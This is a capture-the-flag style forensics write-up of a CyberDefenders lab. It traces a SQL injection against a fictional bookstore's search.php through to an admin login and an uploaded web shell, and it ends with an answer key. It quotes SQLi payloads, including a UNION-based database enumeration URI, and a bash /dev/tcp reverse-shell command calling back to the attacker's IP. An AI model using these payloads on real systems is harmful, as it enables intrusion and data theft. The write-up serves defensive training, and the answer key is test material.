# 🛡️ Security Writeup – Web Investigation Lab

## 📌 Overview

* **Platform:** Cyberdefenders
* **Category:** Network Forensics
* **Difficulty:** Easy
* **Date:** 07/05/2026

---

## 📖 Scenario

You are a cybersecurity analyst working in the Security Operations Center (SOC) of BookWorld, an expansive online bookstore renowned for its vast selection of literature. BookWorld prides itself on providing a seamless and secure shopping experience for book enthusiasts around the globe. Recently, you've been tasked with reinforcing the company's cybersecurity posture, monitoring network traffic, and ensuring that the digital environment remains safe from threats.
Late one evening, an automated alert is triggered by an unusual spike in database queries and server resource usage, indicating potential malicious activity. This anomaly raises concerns about the integrity of BookWorld's customer data and internal systems, prompting an immediate and thorough investigation.

---

## 🎯 Objectives

As the lead analyst in this case, you are required to analyze the network traffic to uncover the nature of the suspicious activity. Your objectives include identifying the attack vector, assessing the scope of any potential data breach, and determining if the attacker gained further access to BookWorld's internal systems.

---

## 🧰 Tools 

* Tools: Wireshark, Cyberchef, AbuseIPDB

---



## 🔍 Analysis

* By knowing the attacker's IP, we can analyze all logs and actions related to that IP and determine the extent of the attack, the duration of the attack, and the techniques used. Take a look at the Conversations section, we can see that the IP address of 111.224.250.131 accounts for most of all captured packet, indicating it is the primary source of traffic and is attacker's host

  <img width="1328" height="113" alt="image" src="https://github.com/user-attachments/assets/8e5cd9f2-3985-4bb6-a0eb-90a8fe9540b1" />

  <img width="1567" height="582" alt="image" src="https://github.com/user-attachments/assets/372647e6-0434-4cde-8c1f-4e3ccce7e501" />

* If the geographical origin of an IP address is known to be from a region that has no business or expected traffic with our network, this can be an indicator of a targeted attack. Using AbuseIPDB, we know that this IP originated from Shijiazhuang, China

  <img width="631" height="562" alt="image" src="https://github.com/user-attachments/assets/d28ac879-98c3-4a2c-b424-307c819fea0c" />

* Identifying the exploited script allows security teams to understand exactly which vulnerability was used in the attack. This knowledge is critical for finding the appropriate patch or workaround to close the security gap and prevent future exploitation. The search.php script is accessed multiple times, particularly with SQL-like payloads as we can see here. This might be the reason for company's unusual spike in database queries and server resource usage.

  <img width="1871" height="798" alt="image" src="https://github.com/user-attachments/assets/3ec502b3-7ba4-43ec-b57f-1f26ce1f22c9" />

* Establishing the timeline of an attack, starting from the initial exploitation attempt. Below is the hacker's first attempt to SQL injection (1=1)

  <img width="1656" height="683" alt="image" src="https://github.com/user-attachments/assets/62969814-ab90-4fef-8348-ba5c50a8f3e5" />

  <img width="1165" height="458" alt="image" src="https://github.com/user-attachments/assets/a6105420-d24f-4f9d-be56-d552c0c5c845" />

* The malicious actor's request containing database-related keywords like INFORMATION_SCHEMA, which often signify attempts to enumerate database details. **FROM INFORMATION_SCHEMA.SCHEMATA**: This system table contains metadata about all databases. Querying it is a way to discover what databases exist.

  <img width="1878" height="652" alt="image" src="https://github.com/user-attachments/assets/6c741e05-f4c9-487e-8853-a69842f485de" />
  <img width="1530" height="478" alt="image" src="https://github.com/user-attachments/assets/640af007-ecd2-4e92-b38b-1912a2d72d8f" />

* Assessing the impact of the breach and data access is crucial, including the potential harm to the organization's reputation. The attacker tried to extract the information from customer table that contain website users data.

  <img width="1862" height="554" alt="image" src="https://github.com/user-attachments/assets/8b3c3148-d333-4c66-a6de-2057c28e01e7" />
  <img width="1525" height="483" alt="image" src="https://github.com/user-attachments/assets/cc64299e-806f-4458-97f8-9e6c1dc0f1f4" />

* The website directories hidden from the public could serve as an unauthorized access point or contain sensitive functionalities not intended for public access. To focus on requests login attempts or interactions with restricted areas, we filter for POST request from the hacker. The admin directory was discovered.

  <img width="1876" height="768" alt="image" src="https://github.com/user-attachments/assets/931a6b21-a63a-4f8a-bd77-d7d5f595911b" />

* Knowing which credentials were used allows us to determine the extent of account compromise. The attacker tried to log in and success with username=admin&password=admin123! as the server responde with code 302

  <img width="868" height="451" alt="image" src="https://github.com/user-attachments/assets/c48dcaf4-2664-404c-9e6f-9c0fbdb8c0cb" />
  <img width="723" height="458" alt="image" src="https://github.com/user-attachments/assets/9fdbd84d-f12b-4f95-8dfc-2383cb4b76d5" />

* We need to determine if the attacker gained further access or control of our web server. He uploaded a suspicious name script with payload inside

      exec() runs a system command.

      /bin/bash -c 'bash -i >& /dev/tcp/.../443 0>&1': Opens an interactive bash shell and redirects input/output to a remote IP (111.224.250.131) over port 443.

      --> This is a reverse shell: the compromised server connects back to the attacker’s machine, giving them remote command execution.

  <img width="928" height="723" alt="image" src="https://github.com/user-attachments/assets/191e5d46-b32d-4715-bfed-e821d92f84b9" />


---

## 🧾 Key Findings

* Attacker IP & Origin: 111.224.250.131 originating from Shijiazhuang, China 

* Initial Vector: SQL injection vulnerability in search.php – first observed attempt with payload ?search=book and 1=1; -- -.

* Database Enumeration: Attacker extracted database names using INFORMATION_SCHEMA.SCHEMATA via a UNION-based SQLi payload.

* Data Exfiltration Target: The customers table – containing website user data – was stolen.

* Admin Panel Discovery: Attacker brute‑forced or guessed the /admin/ directory, then successfully logged in with credentials admin:admin123!.

* Persistence & Control: Uploaded a malicious PHP script (NVri2vhp.php) containing a reverse shell connecting back to the attacker’s IP on port 443.


---



## 💡 Lessons Learned

* Input validation is necessary – a single vulnerable search.php led to full server compromise.
* Default / weak credentials (admin:admin123!) remain a critical risk – even after SQL injection, the attacker gained admin access through brute‑force or guessing.
*  **FROM INFORMATION_SCHEMA.SCHEMATA**: This system table contains metadata about all databases. Querying it is a way to discover what databases exist.
---

## ❓ Answers

| Question | Answer |
| -------- | ------ |
| Q1: Can you provide the attacker's IP?       | 111.224.250.131    |
| Q2: Can you determine the origin city of the attacker?       | Shijiazhuang    |
| Q3: Can you provide the vulnerable PHP script name?       | search.php    |
| Q4: What is the complete request URI of the first SQLi attempt by the attacker?       | /search.php?search=book and 1=1; -- -    |
| Q5: Can you provide the complete request URI that was used to read the web server's available databases?       | /search.php?search=book' UNION ALL SELECT NULL,CONCAT(0x7178766271,JSON_ARRAYAGG(CONCAT_WS(0x7a76676a636b,schema_name)),0x7176706a71) FROM INFORMATION_SCHEMA.SCHEMATA-- -    |
| Q6: What's the table name containing the website users data?       | customers    |
| Q7: Can you provide the name of the directory discovered by the attacker?       | /admin/    |
| Q8: What are the credentials used by the attacker for logging in?       | admin:admin123!    |
| Q9: What's the name of the malicious script uploaded by the attacker?       | NVri2vhp.php    |

---

